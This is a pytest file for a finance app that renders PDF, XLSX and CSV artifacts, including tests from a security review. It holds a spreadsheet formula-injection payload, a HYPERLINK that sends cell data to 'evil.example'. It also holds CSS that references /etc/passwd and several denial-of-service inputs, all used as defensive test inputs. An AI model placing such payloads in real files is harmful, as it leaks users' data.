"""Artifacts as finance files: PDF from HTML, XLSX/CSV from a typed table spec.

Synthetic data only. The injection tests matter most: a merchant name is untrusted text a model
may copy verbatim, and a spreadsheet must never run it as a formula.
"""

from __future__ import annotations

import io
import json

import pytest

import backend.db.artifact_store as artifact_store_mod
import backend.services.artifacts as artifacts_service
from backend.core.errors import ValidationError
from backend.db.artifact_store import ArtifactStore
from backend.services import artifact_formats, artifact_pdf

HOSTILE = '=HYPERLINK("http://evil.example/?d="&A1,"refund")'


def _spec(**sheet) -> str:
    base = {
        "name": "Transactions",
        "title": "Synthetic ledger",
        "columns": [
            {"header": "Date", "type": "date"},
            {"header": "Payee", "type": "text"},
            {"header": "Amount", "type": "money", "currency": "EUR"},
            {"header": "Share", "type": "percent"},
        ],
        "rows": [
            ["2026-03-01", "Northbridge Properties", 1200.0, 0.5],
            ["2026-03-04", HOSTILE, 64.25, 0.0268],
            ["2026-03-09", "+44 phone top-up", 20, None],
        ],
        "totals": ["Amount"],
    }
    base.update(sheet)
    return json.dumps({"sheets": [base]})


@pytest.fixture()
def store(tmp_path, monkeypatch, db_isolated):
    art_dir = tmp_path / "artifacts"
    art_dir.mkdir()
    monkeypatch.setattr(artifact_store_mod, "ARTIFACTS_DIR", art_dir)
    monkeypatch.setattr(artifact_store_mod, "DATA_DIR", tmp_path)
    monkeypatch.setattr(artifacts_service, "_store", ArtifactStore())
    artifacts_service._turn_ctx.set(None)


def _workbook(data: bytes):
    from openpyxl import load_workbook

    return load_workbook(io.BytesIO(data))


def test_xlsx_is_a_formatted_workbook_with_live_totals(store):
    rec = artifacts_service.create_artifact(
        title="March spending", content=_spec(), artifact_type="xlsx"
    )
    assert rec["filename"] == "March spending.xlsx"
    ws = _workbook(artifacts_service.read_bytes(rec["id"]))["Transactions"]

    assert ws["A1"].value == "Synthetic ledger"
    assert [c.value for c in ws[3]] == ["Date", "Payee", "Amount", "Share"]
    assert ws["A3"].font.bold and ws.freeze_panes == "A4"
    assert ws["C4"].number_format.startswith('"EUR "#,##0.00')
    assert ws["D4"].number_format == "0.0%"
    assert ws["A4"].number_format == "d mmm yyyy"
    assert ws["C7"].value == "=SUM(C4:C6)"  # the spreadsheet adds it up, not the model
    assert ws.auto_filter.ref == "A3:D6"


def test_xlsx_never_turns_untrusted_text_into_a_formula(store):
    rec = artifacts_service.create_artifact(title="t", content=_spec(), artifact_type="xlsx")
    ws = _workbook(artifacts_service.read_bytes(rec["id"]))["Transactions"]
    for cell in (ws["B5"], ws["B6"]):
        assert cell.data_type == "s", cell.value
    assert ws["B5"].value == HOSTILE


def test_csv_neutralises_formula_text_and_keeps_numbers_plain(store):
    rec = artifacts_service.create_artifact(title="t", content=_spec(), artifact_type="csv")
    lines = artifacts_service.read_text(rec["id"]).splitlines()
    assert lines[0] == "Date,Payee,Amount,Share"
    assert lines[1] == "2026-03-01,Northbridge Properties,1200.0,0.5"
    assert lines[2].split(",", 2)[1].startswith("\"'=HYPERLINK")
    assert lines[3] == "2026-03-09,'+44 phone top-up,20.0,"


@pytest.mark.parametrize(
    "bad, message",
    [
        ("not json", "JSON table spec"),
        (json.dumps({"sheets": []}), "non-empty"),
        (_spec(rows=[["2026-03-01", "x", "12.50", None]]), "take a number"),
        (_spec(rows=[["03/01/2026", "x", 1.0, None]]), "YYYY-MM-DD"),
        (_spec(rows=[["2026-03-01", "x"]]), "exactly 4 cells"),
        (_spec(totals=["Payee"]), "must be numeric"),
        (_spec(totals=["Nope"]), "column headers"),
    ],
)
def test_a_bad_spec_is_refused_with_where_it_went_wrong(store, bad, message):
    with pytest.raises(ValidationError, match=message):
        artifacts_service.create_artifact(title="t", content=bad, artifact_type="xlsx")


def test_pdf_is_laid_out_from_html_with_title_and_page_numbers(store):
    import pymupdf

    html = """<html><head><style>
      :root { --ink: #102a23; --over: #b42318; }
      @media (prefers-color-scheme: dark) { :root { --ink: #e6efeb; } }
      body { color: var(--ink); } .over { color: var(--over); }
    </style></head><body><h1>Monthly report</h1>
    <table><tr><td>Eating out</td><td class="over">over by EUR 80.00</td></tr></table>
    <script>alert(1)</script></body></html>"""
    rec = artifacts_service.create_artifact(title="March report", content=html, artifact_type="pdf")
    doc = pymupdf.open(stream=artifacts_service.read_bytes(rec["id"]), filetype="pdf")

    text = doc[0].get_text()
    assert "Monthly report" in text and "over by EUR 80.00" in text
    assert "alert(1)" not in text
    assert "Page 1 of 1" in text and doc.metadata["title"] == "March report"


def test_css_flattening_keeps_the_light_palette_and_drops_dark_mode():
    css = artifact_pdf._flatten_css(
        ":root{--ink:#111} @MEDIA (x){:root{--ink:#eee}} p{color:var(--ink)}"
    )
    assert "@media" not in css.lower() and "#eee" not in css
    assert "p{color:#111}" in css
    # A variable built from another variable is never expanded — no compounding growth.
    chained = artifact_pdf._flatten_css(":root{--a:#111;--b:var(--a)} p{color:var(--b, red)}")
    assert "p{color:red}" in chained


def test_an_html_artifact_converts_to_pdf_by_id_without_resending_it(store):
    import pymupdf

    page = "<html><body><h1>Statement</h1><table><tr><td>Rent</td></tr></table></body></html>"
    html = artifacts_service.create_artifact(title="Statement", content=page)
    pdf = artifacts_service.create_artifact(
        title="Statement", content=None, artifact_type="pdf", source_artifact_id=html["id"]
    )
    doc = pymupdf.open(stream=artifacts_service.read_bytes(pdf["id"]), filetype="pdf")
    assert "Statement" in doc[0].get_text()

    with pytest.raises(ValidationError, match="html artifact"):
        artifacts_service.create_artifact(
            title="x", content=None, artifact_type="pdf", source_artifact_id=pdf["id"]
        )
    with pytest.raises(ValidationError, match="pdf only"):
        artifacts_service.create_artifact(
            title="x", content=None, artifact_type="xlsx", source_artifact_id=html["id"]
        )


def test_download_serves_each_format_with_its_type_and_the_preview_refuses_binaries(store):
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    from backend.api.artifacts import router

    app = FastAPI()
    app.include_router(router)
    client = TestClient(app, headers={"X-Requested-With": "XMLHttpRequest"})
    xlsx = artifacts_service.create_artifact(title="t", content=_spec(), artifact_type="xlsx")
    csv_ = artifacts_service.create_artifact(title="t", content=_spec(), artifact_type="csv")

    got = client.get(f"/api/artifacts/{xlsx['id']}/download")
    assert got.status_code == 200
    assert got.headers["content-type"].startswith("application/vnd.openxmlformats")
    assert got.headers["content-disposition"].startswith("attachment;")
    assert got.content[:2] == b"PK"  # a zip container, i.e. a real workbook
    assert client.get(f"/api/artifacts/{xlsx['id']}").status_code == 415
    assert client.get(f"/api/artifacts/{csv_['id']}").text.startswith("Date,Payee")


# ── Security review 2026-10-01: each finding's attack input, now bounded or inert ─────────


def _quick(fn, seconds: float = 3.0):
    import time

    started = time.monotonic()
    try:
        return fn()
    finally:
        assert time.monotonic() - started < seconds, "should be refused or finished promptly"


@pytest.mark.parametrize(
    "page",
    [
        "<table><tr><td>" + "line<br>" * 400 + "</td></tr></table>",  # one block > a page
        '<p style="font-size:3000px">X</p>',
        '<p style="page-break-before:always">x</p>' * (artifact_pdf.MAX_PDF_PAGES + 50),
    ],
    ids=["tall-table-cell", "huge-font", "too-many-pages"],
)
def test_h1_a_page_that_never_fits_is_refused_not_looped_forever(page):
    with pytest.raises(ValidationError):
        _quick(lambda: artifact_pdf.render_pdf(f"<html><body>{page}</body></html>", title="t"))


def test_h2_css_variables_cannot_balloon():
    big = "x" * 50_000
    css = ":root{--a:" + big + "}" + "p{color:var(--a)}" * 20_000
    out = _quick(lambda: artifact_pdf._flatten_css(css[: artifact_pdf._MAX_CSS_CHARS]))
    # The definition may stay once; it is never multiplied into each use.
    assert len(out) <= artifact_pdf._MAX_CSS_CHARS and out.count(big) <= 1


@pytest.mark.parametrize("unit", ["<style>", "<script ", "<body>", '<a data-screen-only x="1"'])
def test_h3_malformed_markup_is_linear_not_quadratic(unit):
    page = unit * 40_000  # was 17–59 s per regex on the old code

    def run():
        try:
            artifact_pdf._pdf_parts(page)
        except ValidationError:
            pass  # too much markup is refused — also fine, as long as it's prompt

    _quick(run)


def test_h4_the_sheet_title_is_text_not_a_formula(store):
    rec = artifacts_service.create_artifact(
        title="t", content=_spec(title=HOSTILE), artifact_type="xlsx"
    )
    ws = _workbook(artifacts_service.read_bytes(rec["id"]))["Transactions"]
    assert ws["A1"].data_type == "s" and ws["A1"].value == HOSTILE


def test_m1_fonts_imports_and_urls_never_reach_the_pdf_engine():
    css = artifact_pdf._flatten_css(
        "@FONT-FACE{font-family:x;src:url(/etc/hosts)} @import url(x.css); "
        "p{background:url(file:///etc/passwd)} @font-face {src:url(a.ttf)}"
    )
    assert "font-face" not in css.lower() and "@import" not in css.lower()
    assert "url(" not in css.lower() and "/etc" not in css
    body, css2 = artifact_pdf._pdf_parts(
        "<body><style>@font-face{src:url(/x.ttf)}</style><link rel=stylesheet href=/x>"
        "<p>ok</p></body>"
    )
    assert "<style" not in body.lower() and "<link" not in body.lower() and "url(" not in css2


def test_m2_a_turn_past_its_cap_is_refused_before_anything_is_rendered(store, monkeypatch):
    rendered = []
    real = artifacts_service._render
    monkeypatch.setattr(artifacts_service, "_render", lambda *a: rendered.append(a[0]) or real(*a))
    artifacts_service.begin_turn("s1")
    for _ in range(artifacts_service.MAX_ARTIFACTS_PER_TURN):
        artifacts_service.create_artifact(title="t", content=_spec(), artifact_type="csv")
    with pytest.raises(ValidationError, match="per turn"):
        artifacts_service.create_artifact(title="t", content=_spec(), artifact_type="xlsx")
    assert rendered == ["csv"] * artifacts_service.MAX_ARTIFACTS_PER_TURN


def test_m2_a_failed_render_gives_its_turn_slot_back(store):
    artifacts_service.begin_turn("s1")
    with pytest.raises(ValidationError):
        artifacts_service.create_artifact(title="t", content="not json", artifact_type="xlsx")
    for _ in range(artifacts_service.MAX_ARTIFACTS_PER_TURN):
        artifacts_service.create_artifact(title="t", content=_spec(), artifact_type="csv")


def test_m2_a_huge_table_is_refused_at_parse_time():
    rows = [[1.0] * 60] * 5000  # 300K cells
    spec = {
        "sheets": [
            {
                "name": "s",
                "columns": [{"header": f"c{i}", "type": "number"} for i in range(60)],
                "rows": rows,
            }
        ]
    }
    with pytest.raises(ValidationError, match="cells"):
        artifact_formats.parse_table_spec(json.dumps(spec))


@pytest.mark.parametrize("text", ["＝1+1", "  =1+1", "\n=1+1", " @SUM(A1)"])
def test_l1_look_alike_and_indented_formulas_are_neutralised_in_csv(text):
    assert artifact_formats._safe_text(text).startswith("'")


def test_l2_control_characters_are_stripped_not_crashing(store):
    rec = artifacts_service.create_artifact(
        title="t",
        content=_spec(rows=[["2026-03-01", "a\x01b\x1fc", 1.0, None]]),
        artifact_type="xlsx",
    )
    ws = _workbook(artifacts_service.read_bytes(rec["id"]))["Transactions"]
    assert ws["B4"].value == "abc"
